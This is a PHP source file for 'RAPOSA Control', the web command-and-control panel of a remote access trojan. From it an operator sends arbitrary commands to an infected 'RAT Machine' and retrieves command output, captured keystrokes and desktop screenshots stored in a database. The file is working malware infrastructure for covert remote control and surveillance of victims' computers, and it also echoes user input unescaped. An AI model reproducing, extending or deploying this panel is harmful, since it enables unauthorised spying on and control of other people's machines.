<?php  
	if(isset($_GET['machine']) && !empty($_GET['machine'])){
		$machine =  $_GET['machine'] ;
	}
	elseif (isset($_POST['machine']) && !empty($_POST['machine'])){
		$machine = $_POST['machine'];
	}
	else{
		$machine = 'no machine';
	}
?>

<section class="section">
    <div class="container">
        <div class="card has-text-centered">
            <figure class="image is-inline-block">
                <img src="<?= "$WEBROOT/assets/images/logo_dark.png"; ?>" alt="Raposa">
            </figure>
        </div>
        <div class="box">
            <h1 class="title has-text-centered">RAPOSA Control</h1>
            <form method="post" action="index.php" id="cmdform">
                
                <div class="field">
                    <label class="label">RAT Machine:</label>
                    <div class="control">
                        <input class="input is-info" type="text" name="machine" readonly value="<?php echo $machine ?>">
                    </div>
                </div>
                
                <div class="field">
                    <label class="label">Run command</label>
                    <div class="control">
                        <input class="input is-info" type="text" name="command" placeholder="start chrome www.google.com" size="35">
                    </div>
                </div>

                <div class="field is-grouped">
                    <div class="control">
                        <button class="button is-danger" type="submit" name="button_execute">Execute</button>
                    </div>
                    <div class="control">
                        <button class="button is-warning" type="submit" name="button_result">Get Output</button>
                    </div>
                    <div class="control">
                        <button class="button is-warning" type="submit" name="button_keylog">Get Keylog</button>
                    </div>
                    <div class="control">
                        <button class="button is-warning" type="submit" name="button_screen">Screen</button>
                    </div>
                    <div class="control">
                        <a class="button is-light" href="/">Home</a>
                    </div>
                </div>
            </form> 
        </div>
        <?php
        if (isset($_POST['button_result'])) {
            $conn = connect_to_db();
            $query = "SELECT output FROM machines WHERE name = ? ORDER BY id DESC LIMIT 1";
            $stmt = $conn->prepare($query);
            $stmt->bind_param('s', $machine);
            $stmt->execute();
            $stmt->bind_result($output);
            $stmt->fetch();
            $stmt->close();
            $conn->close();

            echo '
            <div class="card mt-5">
                <header class="card-header">
                    <p class="card-header-title">
                        Output
                    </p>
                </header>
                <div class="card-content">
                    <div class="content">
                        <textarea class="textarea is-info" rows="20" readonly>' . htmlspecialchars($output) . '</textarea>
                    </div>
                </div>
            </div>';
        }

        if (isset($_POST['button_keylog'])) {
            $conn = connect_to_db();
            $query = "SELECT keylog FROM machines WHERE name = ? ORDER BY id DESC LIMIT 1";
            $stmt = $conn->prepare($query);
            $stmt->bind_param('s', $machine);
            $stmt->execute();
            $stmt->bind_result($output);
            $stmt->fetch();
            $stmt->close();
            $conn->close();

            echo '
            <div class="card mt-5">
                <header class="card-header">
                    <p class="card-header-title">
                        Output
                    </p>
                </header>
                <div class="card-content">
                    <div class="content">
                        <textarea class="textarea is-info" rows="20" readonly>' . htmlspecialchars($output) . '</textarea>
                    </div>
                </div>
            </div>';
        }

        if (isset($_POST['button_screen'])) {
            $conn = connect_to_db();
            $query = "SELECT desktop FROM machines WHERE name = ? ORDER BY id DESC LIMIT 1";
            $stmt = $conn->prepare($query);
            $stmt->bind_param('s', $machine);
            $stmt->execute();
            $stmt->bind_result($output);
            $stmt->fetch();
            $stmt->close();
            $conn->close();
            $img = "<img width='600' src= 'data:image/jpeg;base64," . base64_encode($output) . "'/>";
            echo '
            <div class="card mt-5">
                <header class="card-header">
                    <p class="card-header-title">
                        Desktop
                    </p>
                </header>
                <div class="card-content">
                    <div class="content">';
            echo $img;
            echo '
                    </div>
                </div>
            </div>';
        }
        ?>
    </div>
</section>


<?php
	if(isset($_POST['button_execute'])){
		if(isset($_POST['command']) && !empty($_POST['command'])){
			$command = $_POST['command'];
			echo 'Received: ' . $command . '<br>' . 'For ' . $machine;
			$conn = connect_to_db();
            $query = "UPDATE machines SET command=? WHERE name=?";
            $stmt = $conn->prepare($query);
			$stmt->bind_param('ss',$command, $machine);
			$stmt->execute();
            $conn->close();
		}else {
			echo "Commands cannot be empty";
		}
	}
?>